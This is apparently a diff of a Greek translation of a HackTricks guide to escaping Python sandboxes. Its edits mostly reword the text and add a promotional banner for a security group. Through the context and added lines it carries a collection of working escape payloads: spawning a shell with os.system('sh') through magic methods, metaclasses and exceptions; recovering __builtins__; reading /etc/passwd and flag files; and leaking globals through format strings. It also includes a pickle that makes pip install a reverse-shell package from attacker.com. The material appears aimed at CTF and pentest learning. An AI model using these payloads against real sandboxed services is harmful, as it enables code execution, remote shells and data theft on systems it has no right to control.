@@ -1,4 +1,4 @@
-# Παράκαμψη αμμοθολών Python
+# Παράκαμψη αμμοθολογίων Python
 
 <details>
 
@@ -8,13 +8,21 @@
 
 * Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
-Αυτά είναι μερικά κόλπα για την παράκαμψη των προστασιών αμμοθόλων Python και την εκτέλεση αυθαίρετων εντολών.
+**Ομάδα Ασφαλείας Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
+Αυτά είναι μερικά κόλπα για την παράκαμψη των προστασιών αμμοθολογίων Python και την εκτέλεση αυθαίρετων εντολών.
 
 ## Βιβλιοθήκες Εκτέλεσης Εντολών
 
@@ -51,7 +59,23 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-Να θυμάστε ότι οι συναρτήσεις _**open**_ και _**read**_ μπορούν να είναι χρήσιμες για **ανάγνωση αρχείων** μέσα στο python sandbox και για **εγγραφή κ
+Να θυμάστε ότι οι συναρτήσεις _**open**_ και _**read**_ μπορούν να είναι χρήσιμες για το **διάβασμα αρχείων** μέσα στο python sandbox και για το **γράψιμο κώδικα** που θα μπορούσατε να **εκτελέσετε** για να **παρακάμψετε** το sandbox.
+
+{% hint style="danger" %}
+Η συνάρτηση **Python2 input()** επιτρέπει την εκτέλεση κώδικα Python πριν το πρόγραμμα καταρρεύσει.
+{% endhint %}
+
+Το Python προσπαθεί να **φορτώσει βιβλιοθήκες από τον τρέχοντα κατάλογο πρώτα** (η παρακάτω εντολή θα εκτυπώσει από πού φορτώνει τα modules ο Python): `python3 -c 'import sys; print(sys.path)'`
+
+![](<../../../.gitbook/assets/image (552).png>)
+
+## Παράκαμψη του pickle sandbox με τα προεγκατεστημένα πακέτα Python
+
+### Προεγκατεστημένα πακέτα
+
+Μπορείτε να βρείτε μια **λίστα με προεγκατεστημένα** πακέτα εδώ: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+Σημειώστε ότι από ένα pickle μπορείτε να κάνετε το περιβάλλον Python **να εισάγει αυθαίρετες βιβλιοθήκες** που είναι εγκατεστημένες στο σύστημα.\
+Για παράδειγμα, το ακόλουθο pickle, όταν φορτωθεί, θα εισάγει τη βιβλιοθήκη pip για να τη χρησιμοποιήσει:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -75,12 +99,12 @@ print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Μπορείτε να κατεβάσετε το πακέτο για τη δημιουργία αντίστροφου κελύφους εδώ. Παρακαλώ, σημειώστε ότι πριν το χρησιμοποιήσετε θα πρέπει **να το αποσυμπιέσετε, να αλλάξετε το `setup.py`, και να βάλετε τη διεύθυνση IP σας για το αντίστροφο κέλυφος**:
+Μπορείτε να κατεβάσετε το πακέτο για τη δημιουργία αντίστροφου κελύφους εδώ. Παρακαλώ, σημειώστε ότι πριν το χρησιμοποιήσετε θα πρέπει **να το αποσυμπιέσετε, να αλλάξετε το `setup.py`, και να βάλετε τη διεύθυνση IP σας για το αντίστροφο κελύφωμα**:
 
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
-Αυτό το πακέτο ονομάζεται `Reverse`. Ωστόσο, δημιουργήθηκε ειδικά έτσι ώστε όταν βγείτε από το αντίστροφο κέλυφος η υπόλοιπη εγκατάσταση θα αποτύχει, έτσι ώστε **να μην αφήσετε κανένα επιπλέον πακέτο Python εγκατεστημένο στον διακομιστή** όταν φύγετε.
+Αυτό το πακέτο ονομάζεται `Reverse`. Ωστόσο, δημιουργήθηκε ειδικά έτσι ώστε όταν βγείτε από το αντίστροφο κελύφωμα η υπόλοιπη εγκατάσταση θα αποτύχει, έτσι ώστε **να μην αφήσετε κανένα επιπλέον πακέτο Python εγκατεστημένο στον διακομιστή** όταν φύγετε.
 {% endhint %}
 
 ## Αξιολόγηση κώδικα Python
@@ -146,7 +170,7 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-Είναι επίσης δυνατόν να το παρακάμψετε χρησιμοποιώντας άλλες κωδικοποιήσεις, π.χ. `raw_unicode_escape` και `unicode_escape`.
+Είναι επίσης δυνατό να το παρακάμψετε χρησιμοποιώντας άλλες κωδικοποιήσεις, π.χ. `raw_unicode_escape` και `unicode_escape`.
 
 ## Εκτέλεση Python χωρίς κλήσεις
 
@@ -180,7 +204,7 @@ class _:pass
 
 #### RCE με προσαρμοσμένες κλάσεις
 
-Μπορείτε να τροποποιήσετε μερικές **μεθόδους κλάσης** (_με την υπερφόρτωση υπαρχουσών μεθόδων κλάσης ή δημιουργώντας μια νέα κλάση_) για να τις κάνετε να **εκτελούν αυθαίρετο κώδικα** όταν **ενεργοποιηθούν** χωρίς να κληθούν απευθείας.
+Μπορείτε να τροποποιήσετε μερικές **μεθόδους κλάσης** (_με την υπερφόρτωση υπαρχουσών μεθόδων κλάσης ή δημιουργώντας μια νέα κλάση_) για να τις κάνετε να **εκτελούν αυθαίρετο κώδικα** όταν **ενεργοποιούνται** χωρίς να κληθούν απευθείας.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -232,7 +256,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### Δημιουργία αντικειμένων με [μετακλάσεις](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-Το κύριο πράγμα που μας επιτρέπουν οι μετακλάσεις είναι **να δημιουργήσουμε μια πρότυπη κλάση, χωρίς να καλέσουμε τον κατασκευαστή** απευθείας, δημιουργώντας μια νέα κλάση με την επιθυμητή κλάση ως μετακλάση.
+Το κύριο πράγμα που μας επιτρέπουν οι μετακλάσεις είναι **να δημιουργήσουμε ένα παράδειγμα μιας κλάσης, χωρίς να καλέσουμε τον κατασκευαστή** απευθείας, δημιουργώντας μια νέα κλάση με την επιθυμητή κλάση ως μετακλάση.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -249,7 +273,7 @@ Sub['import os; os.system("sh")']
 ```
 #### Δημιουργία αντικειμένων με εξαιρέσεις
 
-Όταν **ενεργοποιείται μια εξαίρεση**, δημιουργείται ένα αντικείμενο της **Εξαίρεσης** χωρίς να χρειάζεται να καλέσετε τον κατασκευαστή απευθείας (ένα κόλπος από τον [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+Όταν **ενεργοποιείται μια εξαίρεση**, δημιουργείται ένα αντικείμενο της **Εξαίρεσης** χωρίς να χρειάζεται να καλέσετε τον κατασκευαστή απευθείας (ένα κόλπο από τον [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -302,18 +326,18 @@ pass
 ```
 ## Ενσωματωμένες Συναρτήσεις
 
-* [**Ενσωματωμένες συναρτήσεις της python2**](https://docs.python.org/2/library/functions.html)
-* [**Ενσωματωμένες συναρτήσεις της python3**](https://docs.python.org/3/library/functions.html)
+* [**Ενσωματωμένες συναρτήσεις της Python 2**](https://docs.python.org/2/library/functions.html)
+* [**Ενσωματωμένες συναρτήσεις της Python 3**](https://docs.python.org/3/library/functions.html)
 
 Εάν μπορείτε να έχετε πρόσβαση στο αντικείμενο **`__builtins__`** μπορείτε να εισάγετε βιβλιοθήκες (σημειώστε ότι θα μπορούσατε επίσης να χρησιμοποιήσετε εδώ και άλλη αναπαράσταση συμβολοσειράς που εμφανίζεται στην τελευταία ενότητα):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
-### Χωρίς Builtins
+### Χωρίς Ενσωματωμένες Συναρτήσεις
 
-Όταν δεν έχετε `__builtins__` δεν θα μπορείτε να εισάγετε τίποτα ούτε να διαβάσετε ή να γράψετε αρχεία καθώς **όλες οι γενικές συναρτήσεις** (όπως `open`, `import`, `print`...) **δεν φορτώνονται**.\
-Ωστόσο, **από προεπιλογή το Python εισάγει πολλά modules στη μνήμη**. Αυτά τα modules μπορεί να φαίνονται αθώα, αλλά μερικά από αυτά **εισάγουν και επικίνδυνες** λειτουργίες μέσα σε αυτά που μπορούν να προσπελαστούν για να επιτευχθεί ακόμα και **αυθαίρετη εκτέλεση κώδικα**.
+Όταν δεν έχετε το `__builtins__` δεν θα μπορείτε να εισάγετε τίποτα ούτε να διαβάσετε ή να γράψετε αρχεία καθώς **όλες οι γενικές συναρτήσεις** (όπως `open`, `import`, `print`...) **δεν φορτώνονται**.\
+Ωστόσο, **από προεπιλογή το Python εισάγει πολλά modules στη μνήμη**. Αυτά τα modules μπορεί να φαίνονται αθώα, αλλά μερικά από αυτά **εισάγουν επικίνδυνες** λειτουργίες μέσα τους που μπορούν να προσπελαστούν για να επιτευχθεί ακόμα και **εκτέλεση αυθαίρετου κώδικα**.
 
 Στα παρακάτω παραδείγματα μπορείτε να παρατηρήσετε πως να **καταχραστείτε** μερικά από αυτά τα "**αθώα**" modules που φορτώνονται για να **έχετε πρόσβαση** σε **επικίνδυνες** **λειτουργίες** μέσα σε αυτά.
 
@@ -339,6 +363,8 @@ import __builtin__
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 #### Python3
+
+#### Πυθών 3
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -357,7 +383,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Παρακάτω υπάρχει μια μεγαλύτερη συνάρτηση**](./#recursive-search-of-builtins-globals) για να βρείτε δεκάδες/**εκατοντάδες** **μέρη** όπου μπορείτε να βρείτε τα **builtins**.
+[**Παρακάτω υπάρχει μια μεγαλύτερη συνάρτηση**](./#recursive-search-of-builtins-globals) για να βρείτε δεκάδες/**εκατοντάδες** **σημεία** όπου μπορείτε να βρείτε τα **builtins**.
 
 #### Python2 και Python3
 ```python
@@ -365,7 +391,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Φορτία ενσωματωμένων λειτουργιών
+### Ενσωματωμένα φορτία
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -373,7 +399,7 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## Παγκόσμιες μεταβλητές και τοπικές μεταβλητές
+## Παγκόσμιες και τοπικές μεταβλητές
 
 Ο έλεγχος των **`globals`** και **`locals`** είναι ένας καλός τρόπος για να γνωρίζετε ποιες μεταβλητές μπορείτε να έχετε πρόσβαση.
 ```python
@@ -435,7 +461,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Εντοπισμός επικίνδυνων βιβλιοθηκών που φορτώνονται
 
-Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατή η **εισαγωγή αυθαίρετων βιβλιοθηκών**, μπορείτε να αναζητήσετε όλα τα **φορτωμένα modules που έχουν εισάγει το sys μέσα σε αυτά**:
+Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατή η **εισαγωγή αυθαίρετων βιβλιοθηκών**, μπορείτε να αναζητήσετε όλα τα **ενότητες που έχουν φορτώσει που έχουν εισάγει το sys μέσα σε αυτές**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -498,7 +524,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-Επιπλέον, αν πιστεύετε ότι **άλλες βιβλιοθήκες** μπορεί να είναι σε θέση να **καλέσουν συναρτήσεις για την εκτέλεση εντολών**, μπορούμε επίσης να **φιλτράρουμε με βάση τα ονόματα των συναρτήσεων** μέσα στις πιθανές βιβλιοθήκες:
+Επιπλέον, εάν πιστεύετε ότι **άλλες βιβλιοθήκες** μπορεί να είναι σε θέση να **καλέσουν συναρτήσεις για την εκτέλεση εντολών**, μπορούμε επίσης να **φιλτράρουμε με βάση τα ονόματα των συναρτήσεων** μέσα στις πιθανές βιβλιοθήκες:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -656,13 +682,14 @@ main()
 [broken-reference](broken-reference/)
 {% endcontent-ref %}
 
-## Συμβολοσειρά Μορφοποίησης Python
+## Μορφή Συμβολοσειράς Python
 
-Εάν **στείλετε** μια **συμβολοσειρά** στο python που πρόκειται να **μορφοποιηθεί**, μπορείτε να χρησιμοποιήσετε `{}` για να έχετε πρόσβαση σε **εσωτερικές πληροφορίες του python**. Μπορείτε να χρησιμοποιήσετε τα προηγούμενα παραδείγματα για να έχετε πρόσβαση σε globals ή builtins για παράδειγμα.
+Εάν **στείλετε** μια **συμβολοσειρά** στο python που θα **μορφοποιηθεί**, μπορείτε να χρησιμοποιήσετε `{}` για να έχετε πρόσβαση σε **εσωτερικές πληροφορίες του python**. Μπορείτε να χρησιμοποιήσετε τα προηγούμενα παραδείγματα για να έχετε πρόσβαση σε globals ή builtins για παράδειγμα.
 
 {% hint style="info" %}
-Ωστόσο, υπάρχει μια **περιορισμός**, μπορείτε να χρησιμοποιήσετε μόνο τα σύμβολα `.[]`, οπότε **δεν θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα**, απλά να διαβάσετε πληροφορίες.\
-_**Αν γνωρίζετε πώς να εκτελέσετε κ
+Ωστόσο, υπάρχει μια **περιορισμένη** δυνατότητα, μπορείτε μόνο να χρησιμοποιήσετε τα σύμβολα `.[]`, οπότε **δεν θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα**, μόνο να διαβάσετε πληροφορίες.\
+_**Αν γνωρίζετε πώς να εκτελέσετε κώδικα μέσω αυτής της ευπάθειας, επικοινωνήστε μαζί μου.**_
+{% endhint %}
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -682,9 +709,9 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Σημειώστε πώς μπορείτε **να έχετε πρόσβαση σε γνωρίσματα** με τον κανονικό τρόπο με ένα **τελεία** όπως `people_obj.__init__` και στα **στοιχεία λεξικού** με **παρενθέσεις** χωρίς εισαγωγικά `__globals__[CONFIG]`
+Σημειώστε πώς μπορείτε **να έχετε πρόσβαση σε γνωρίσματα** με τον κανονικό τρόπο με ένα **τελεία** όπως `people_obj.__init__` και στοιχεία **λεξικού** με **παρενθέσεις** χωρίς εισαγωγικά `__globals__[CONFIG]`
 
-Επίσης, μπορείτε να χρησιμοποιήσετε το `.__dict__` για να απαριθμήσετε τα στοιχεία ενός αντικειμένου `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+Επίσης, μπορείτε να χρησιμοποιήσετε το `.__dict__` για να απαριθμήσετε στοιχεία ενός αντικειμένου `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
 Κάποια άλλα ενδιαφέροντα χαρακτηριστικά από τις συμβολοσειρές μορφοποίησης είναι η δυνατότητα **εκτέλεσης** των **συναρτήσεων** **`str`**, **`repr`** και **`ascii`** στο συγκεκριμένο αντικείμενο προσθέτοντας **`!s`**, **`!r`**, **`!a`** αντίστοιχα:
 ```python
@@ -723,13 +750,13 @@ return 'HAL 9000'
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
 ```
-## Ανάλυση Αντικειμένων σε Python
+## Ανάλυση Αντικειμένων Python
 
 {% hint style="info" %}
-Αν θέλετε να **μάθετε** για το **bytecode της Python** λεπτομερώς, διαβάστε αυτήν την **εκπληκτική** ανάρτηση σχετικά με το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Αν θέλετε να **μάθετε** για τον **κώδικα bytecode της Python** λεπτομερώς, διαβάστε αυτήν την **εκπληκτική** ανάρτηση σχετικά με το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-Σε ορισμένα CTFs μπορεί να σας δίνεται το όνομα μιας **προσαρμοσμένης συνάρτησης** όπου βρίσκεται η σημαία και χρειάζεται να δείτε τα **εσωτερικά** της **συνάρτησης** για να την εξάγετε.
+Σε ορισμένα CTFs μπορεί να σας δίνεται το όνομα μιας **προσαρμοσμένης συνάρτησης όπου βρίσκεται η σημαία** και χρειάζεται να δείτε τα **εσωτερικά** της **συνάρτησης** για να την εξάγετε.
 
 Αυτή είναι η συνάρτηση προς επιθεώρηση:
 ```python
@@ -852,7 +879,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Σημείωση ότι **αν δεν μπορείτε να εισάγετε το `dis` στο περιβάλλον Python** μπορείτε να αποκτήσετε το **bytecode** της συνάρτησης (`get_flag.func_code.co_code`) και να το **αποσυναρμολογήσετε** τοπικά. Δεν θα δείτε το περιεχόμενο των μεταβλητών που φορτώνονται (`LOAD_CONST`) αλλά μπορείτε να τις μαντέψετε από το (`get_flag.func_code.co_consts`) επειδή το `LOAD_CONST` δείχνει επίσης τη θέση της μεταβλητής που φορτώνεται.
+Σημείωσε ότι αν δεν μπορείς να εισάγεις το `dis` στο περιβάλλον Python, μπορείς να αποκτήσεις το **bytecode** της συνάρτησης (`get_flag.func_code.co_code`) και να το **αποσυναρμολογήσεις** τοπικά. Δεν θα δεις το περιεχόμενο των μεταβλητών που φορτώνονται (`LOAD_CONST`) αλλά μπορείς να τις μαντέψεις από το (`get_flag.func_code.co_consts`) επειδή το `LOAD_CONST` δείχνει επίσης τη θέση της μεταβλητής που φορτώνεται.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -874,10 +901,10 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Συναρμολόγηση της Python
+## Συλλογή Python
 
-Τώρα, ας φανταστούμε ότι μπορείτε κάπως να **ανακτήσετε τις πληροφορίες για μια συνάρτηση που δεν μπορείτε να εκτελέσετε** αλλά **χρειάζεστε** να την **εκτελέσετε**.\
-Όπως στο παρακάτω παράδειγμα, **μπορείτε να έχετε πρόσβαση στο αντικείμενο κώδικα** αυτής της συνάρτησης, αλλά απλά διαβάζοντας την αποσυναρμολόγηση δεν **ξέρετε πώς να υπολογίσετε τη σημαία** (_φανταστείτε μια πιο πολύπλοκη συνάρτηση `calc_flag`_).
+Τώρα, ας φανταστούμε ότι μπορείτε **να ανακτήσετε τις πληροφορίες για μια συνάρτηση που δεν μπορείτε να εκτελέσετε** αλλά **χρειάζεστε** να την **εκτελέσετε**.\
+Όπως στο παρακάτω παράδειγμα, **μπορείτε να έχετε πρόσβαση στο αντικείμενο κώδικα** αυτής της συνάρτησης, αλλά απλά διαβάζοντας την αποσυναρμολόγηση δεν **ξέρετε πώς να υπολογίσετε τη σημαία** (_φανταστείτε μια πιο πολύπλοκη συνάρτηση `calc_flag`_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -892,7 +919,7 @@ return "Nope"
 ```
 ### Δημιουργία του αντικειμένου κώδικα
 
-Καταρχάς, πρέπει να ξέρουμε **πώς να δημιουργήσουμε και να εκτελέσουμε ένα αντικείμενο κώδικα** ώστε να μπορέσουμε να δημιουργήσουμε ένα για να εκτελέσουμε τη λειτουργία μας που διέρρευσε:
+Καταρχάς, πρέπει να ξέρουμε **πώς να δημιουργήσουμε και να εκτελέσουμε ένα αντικείμενο κώδικα** ώστε να μπορέσουμε να δημιουργήσουμε ένα για να εκτελέσουμε τη λειτουργία μας leaked:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -923,7 +950,7 @@ types.CodeType.__doc__
 ### Αναπαραγωγή μιας διαρρευσμένης συνάρτησης
 
 {% hint style="warning" %}
-Στο παρακάτω παράδειγμα, θα πάρουμε όλα τα δεδομένα που χρειάζονται για την αναπαραγωγή της συνάρτησης απευθείας από το αντικείμενο κώδικα της συνάρτησης. Σε ένα **πραγματικό παράδειγμα**, όλες οι **τιμές** που απαιτούνται για την εκτέλεση της συνάρτησης **`code_type`** είναι αυτό που **θα χρειαστείτε να διαρρεύσετε**.
+Στο παρακάτω παράδειγμα, θα πάρουμε όλα τα δεδομένα που χρειάζονται για την αναπαραγωγή της συνάρτησης απευθείας από το αντικείμενο κώδικα της συνάρτησης. Σε ένα **πραγματικό παράδειγμα**, όλες οι **τιμές** για την εκτέλεση της συνάρτησης **`code_type`** είναι αυτό που **θα χρειαστείτε να διαρρεύσετε**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -935,7 +962,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-### Αντιστροφή Αμυντικών Μέτρων
+### Αντιστροφή Αμυνών
 
 Στα προηγούμενα παραδείγματα στην αρχή αυτής της ανάρτησης, μπορείτε να δείτε **πώς να εκτελέσετε οποιοδήποτε κώδικα Python χρησιμοποιώντας τη λειτουργία `compile`**. Αυτό είναι ενδιαφέρον επειδή μπορείτε **να εκτελέσετε ολόκληρα σενάρια** με βρόχους και τα πάντα σε μια **γραμμή κώδικα** (και θα μπορούσαμε να κάνουμε το ίδιο χρησιμοποιώντας το **`exec`**).\
 Πάντως, μερικές φορές θα μπορούσε να είναι χρήσιμο να **δημιουργήσετε** ένα **μεταγλωττισμένο αντικείμενο** σε ένα τοπικό μηχάνημα και να το εκτελέσετε στο **μηχάνημα CTF** (για παράδειγμα επειδή δεν έχουμε τη λειτουργία `compile` στο CTF).
@@ -967,7 +994,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Αν δεν μπορείτε να έχετε πρόσβαση στο `eval` ή `exec`, μπορείτε να δημιουργήσετε μια **κανονική συνάρτηση**, αλλά η κλήση της απευθείας συνήθως θα αποτύχει με: _constructor not accessible in restricted mode_. Έτσι, χρειάζεστε μια **συνάρτηση που δεν βρίσκεται στο περιορισμένο περιβάλλον για να καλέσετε αυτήν τη συνάρτηση.**
+Αν δεν μπορείτε να έχετε πρόσβαση στο `eval` ή `exec`, μπορείτε να δημιουργήσετε μια **κανονική συνάρτηση**, αλλά η κλήση της απευθείας συνήθως αποτυγχάνει με: _constructor not accessible in restricted mode_. Έτσι, χρειάζεστε μια **συνάρτηση που δεν βρίσκεται στο περιορισμένο περιβάλλον για να καλέσετε αυτήν τη συνάρτηση.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1008,18 +1035,22 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-***
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Άλλοι τρόποι υποστήριξης του HackTricks:
 
 * Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
